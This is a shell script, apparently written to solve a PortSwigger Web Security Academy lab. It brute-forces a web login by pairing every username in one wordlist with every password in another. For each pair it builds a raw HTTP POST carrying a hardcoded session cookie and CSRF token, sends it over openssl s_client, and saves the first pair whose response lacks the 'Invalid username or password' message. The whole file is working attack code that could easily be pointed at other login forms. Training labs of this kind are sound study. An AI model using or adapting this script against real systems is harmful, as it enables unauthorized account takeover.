#!/bin/sh
ContentLength=0;
#username=albuquerque;
i=0;
while read username
do
#	cat passwords.txt | while read password
#	do
#		echo $username, $password;
#		i=$((i+1));
#		echo $i;
#		touch $i;
#	done
	usernames[$i]=$username
#	echo ${usernames[$i]}
	i=$((i+1));
done < usernames.txt

i=0;
while read password
do
	passwords[$i]=$password
	i=$((i+1))
done < passwords.txt

for (( i=0; i < 100; i++ ))
do
	for (( j=0; j < 100; j++ ))
	do
		
		ContentLength=$((57+${#usernames[$i]}+${#passwords[$j]}));
		method="POST /login HTTP/1.1\r\nHost: ac751f831eb27c8e80d027af00020075.web-security-academy.net\r\nContent-Length: $ContentLength\r\nCookie: session=OuIztXgIE8CePt98wHNaLDMo7X2LocQz\r\n\r\ncsrf=eGWPMyIr5PU7lxgKuZKe733nRDdGhZg6&username=${usernames[$i]}&password=${passwords[$j]}";

		#echo $method			
		(echo -e $method) | openssl s_client -ign_eof -connect ac751f831eb27c8e80d027af00020075.web-security-academy.net:443 | grep "Invalid username or password" > tt;
		#| grep "Invalid username or password" > tt
		echo ${usernames[$i]}, ${passwords[$j]}
		cat tt
		[ ! -s tt ] && echo ${usernames[$i]}, ${passwords[$j]} >> right6 && exit;		
	done
done
